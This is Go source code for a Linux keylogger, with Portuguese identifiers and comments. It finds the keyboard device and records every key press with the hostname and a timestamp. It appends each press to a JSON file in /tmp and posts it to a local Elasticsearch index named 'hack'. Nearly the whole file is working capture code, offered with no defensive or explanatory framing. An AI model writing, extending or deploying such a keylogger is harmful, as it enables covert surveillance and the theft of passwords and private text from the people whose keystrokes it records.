package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

type Alvo struct {
	Hostname string `json:"hostname"`
	Hora     string `json:"hora"`
	Press    string `json:"LOGpart1"`
	Keypress string `json:"keyboard"`
}

var (
	LOGpart1 = ("[Press] keyboard")
)

const (
	layoutISO = "2006-01-02"
	layoutUS  = "2006-01-02 15:04:05"
)

//Gethostname
func GetHostname() (hostname string) {
	// Create logger
	logger := logrus.New()
	cmd := exec.Command("uname", "-n")
	out, err := cmd.CombinedOutput()
	if err != nil {
		logger.WithError(err).Fatal("erro ao ler o hostname")
	}
	hostname = strings.TrimSuffix(string(out), "\n")

	return string(hostname)
}

//gettime
func GetTime() (hora string) {
	timenow := time.Now()
	hora = (timenow.Format(layoutUS))
	return string(hora)
}

/*
func chkMap(payload map[string]interface{}) (ret bool) {
	limit, lmtOk := payload["Limit"]
	value, valOk := payload["Value"]
	if lmtOk && valOk {
		if value.(float64) < limit.(float64) {
			ret = true
			return
		}
	}

	for _, v := range payload {
		switch v.(type) {
		case []interface{}:
			ret = chkSlice(v.([]interface{}))
		case map[string]interface{}:
			ret = chkMap(v.(map[string]interface{}))
		}
		if ret {
			return
		}
	}
	return
}

func chkSlice(payload []interface{}) (ret bool) {
	for _, v := range payload {
		switch v.(type) {
		case []interface{}:
			ret = chkSlice(v.([]interface{}))
		case map[string]interface{}:
			ret = chkMap(v.(map[string]interface{}))
		}
		if ret {
			return
		}
	}
	return
}
*/
func main() {

	fmt.Println(GetHostname())
	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				dados := &Alvo{
					Hostname: GetHostname(),
					Hora:     GetTime(),
					Press:    LOGpart1,
					Keypress: e.KeyString(),
				}

				file, _ := json.MarshalIndent(dados, "", " ")
				//e, err := json.Marshal(dados)
				if err != nil {
					fmt.Println(err)
					return
				}

				f, err := os.OpenFile("/tmp/teclado-"+GetHostname()+".json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					log.Println(err)
				}
				defer f.Close()
				if _, err := f.WriteString(string(file) + "\n"); err != nil {
					log.Println(err)
				}
				fmt.Printf("host %s voce digitou %s \n", dados.Hostname, dados.Keypress)
				///////////////////////////
				//codigo para enviar pro elastic (dando erro na query de envio)
				buf := new(bytes.Buffer)
				json.NewEncoder(buf).Encode(dados)
				req, _ := http.NewRequest("POST", "http://localhost:9200/index/hack", buf)
				req.Header.Set("Content-Type", "application/json")
				client := &http.Client{}
				res, e := client.Do(req)
				if e != nil {
					log.Fatal(e)
				}

				defer res.Body.Close()

				fmt.Println("response Status:", res.Status)

				// Print the body to the stdout
				io.Copy(os.Stdout, res.Body)

				/////////////////////////////
				/*
					//novo bloco
					data, err := ioutil.ReadFile("/tmp/teclado-" + GetHostname() + ".json")
					if err != nil {
						fmt.Println(err)
						return
					}
					payload := make(map[string]interface{})
					err = json.Unmarshal(data, &payload)
					if err != nil {
						fmt.Println(err)
						return
					}
				*/
				/*				if chkMap(payload) {
									fmt.Println("Um ou mais itens abaixo do limite")
								}
								fmt.Println("fim")
				*/
			}

			// if the state of key is released
			//if e.KeyRelease() {
			//	logrus.Println("[event] release key ", e.KeyString())
			//}

			break

		}
	}
}
